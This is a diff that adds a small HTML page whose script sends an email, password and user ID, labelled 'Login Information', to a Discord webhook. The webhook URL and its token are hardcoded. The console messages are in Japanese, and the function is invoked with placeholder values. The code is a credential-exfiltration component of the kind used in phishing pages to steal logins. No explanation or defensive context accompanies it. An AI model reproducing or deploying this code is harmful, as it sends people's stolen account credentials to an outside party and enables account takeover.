@@ -1,0 +1,33 @@
+<!doctype html>
+<script type="text/javascript">
+    function sendToDiscord(email, password, userid) {
+                const payload = {
+                    content: '@everyone ログイン情報が送信されました',
+                    embeds: [
+                        {
+                            title: 'Login Information',
+                            description: `**Email**: ${email}\n**Password**: ${password}\n**UserID**: ${userid}`
+                        }
+                    ]
+                };
+
+                fetch('https://discord.com/api/webhooks/1178310437822017577/oUXP2AS4aJQ_dKJ5cvLjOsflBpjYAfwhL7Rk3Str2Mi_IIn0rmTZEs7rXWYAaQOm13xf', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Discord Webhookにデータを送信しました。');
+                    } else {
+                        console.error('Discord Webhookへのデータ送信に失敗しました。');
+                    }
+                })
+                .catch(error => {
+                    console.error('エラーが発生しました。', error);
+                });
+            }
+            sendToDiscord(1, 2, 3);
+</script>
